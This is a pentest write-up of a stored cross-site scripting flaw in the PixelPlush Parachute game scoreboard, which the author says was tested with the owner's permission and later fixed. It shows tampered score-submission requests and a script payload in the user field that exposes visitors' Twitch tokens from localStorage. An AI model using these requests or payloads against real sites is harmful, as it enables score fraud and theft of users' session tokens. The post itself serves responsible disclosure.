---
title: 'Pentesting | XSS in the Pixelplush Scoreboard'
date: "2021-05-25T00:00:00Z"
tags: [xss,pixelplush]
---

This writeup is about the **XSS in the [PixelPlush](https://pixelplush.dev) Scoreboard**. 

NOTE: Please always ask for permissions when pentesting a website!



When I decided to pentest [PixelPlush](https://pixelplush.dev) (ofcourse with permission), I was looking for possible vulnerable endpoints that possibly reflect data into a page. I saw that the site has a scoreboard for the Parachute game, and decided this is a nice place to start.



First I took a look at the requests the page made, This one stood out.

![](/assets/CTFs/Pentesting/PixelPlush-Scoreboard-XSS/get-scoreboard-scores.png)



It returns JSON, In this case an array with objects that contain the username, the score and the user-id.

I will provide a example object below.

```json
{
  "userId": "13371337",
  "username": "leethaxor",
  "user": "leethaxor",
  "score": 99.99,
  "created": "2021-05-13T17:16:29.468Z",
  "updated": "2021-05-13T17:16:29.468Z"
}
```



Now we need to know the endpoint that submits the points.

We can simply do this by starting the overlay ourselves and playing it, while having burp open to capture any requests it makes. Finally after a few tries I win some points and a request is made.



![](/assets/CTFs/Pentesting/PixelPlush-Scoreboard-XSS/post-add-score.png)



The data being send is a JSON Object (sample down below)

```json
{
  "token": "REDACTED",
  "channel": "portaalgaming",
  "game": "parachute",
  "theme": "Pixel Parachute (Day)",
  "user": "PortaalGaming",
  "score": "92.98",
  "userId": "244294836",
  "username": "portaalgaming"
}
```

The URL its being send to is https://api.pixelplush.dev/v1/scores/add

Lets send this request to the repeater in Burp Suite. First we can test changing the score count over 100, cause 100 is the limit of the game.



Lets send the following request

```http
POST /v1/scores/add HTTP/1.1
Host: api.pixelplush.dev
Content-Length: 206
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90", "Microsoft Edge";v="90"
Dnt: 1
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://www.pixelplush.dev
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.pixelplush.dev/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,nl;q=0.8
Sec-Gpc: 1
Connection: close

{"token":"REDACTED","channel":"portaalgaming","game":"writeup","theme":"Pixel Parachute (Day)","user":"PortaalGaming","score":"999999","userId":"244294836","username":"portaalgaming"}
```



When we now open the page (or send a request to the points endpoint). And yes it set the amount of points, to over 100.

![](/assets/CTFs/Pentesting/PixelPlush-Scoreboard-XSS/get-scoreboard-faked-points.png)

```json
[
  {
    "userId": "244294836",
    "username": "portaalgaming",
    "user": "PortaalGaming",
    "score": 999999,
    "created": "2021-05-25T08:17:56.807Z",
    "updated": "2021-05-25T08:17:56.807Z"
  }
]
```



Now that we know the score isn't safe, lets try to inject html into the user field. Maybe it will work.

```json
{
  "token": "REDACTED",
  "channel": "portaalgaming",
  "game": "writeup",
  "theme": "Pixel Parachute (Day)",
  "user": "<b>PortaalGaming",
  "score": "1337",
  "userId": "244294836",
  "username": "portaalgaming"
}
```

And the server returns with

```json
{ "success": 1 }
```

Nice, it injected the code into the website. (Please note that this now has been fixed and you cant exploit it anymore)


Now lets inject some JavaScript to alert your twitch token. The twitch token is saved inside of the localStorage. 

```json
{
  "token": "REDACTED",
  "channel": "portaalgaming",
  "game": "writeup",
  "theme": "Pixel Parachute (Day)",
  "user": "<script>alert('H4x3d by Daanbreur. Your twitch token is: '+localStorage.getItem('twitchToken'))</script>",
  "score": "1337",
  "userId": "244294836",
  "username": "portaalgaming"
}
```

And if you now open the website, navigate to the scoreboard and open my page, you would have been greeted with an alert that told your twitch token!

![](/assets/CTFs/Pentesting/PixelPlush-Scoreboard-XSS/xss-alert.png)


**Big Thanks to [Instafluff](https://twitch.tv/instafluff) Creator of Pixelplush for letting me pentest the website and write this writeup!**
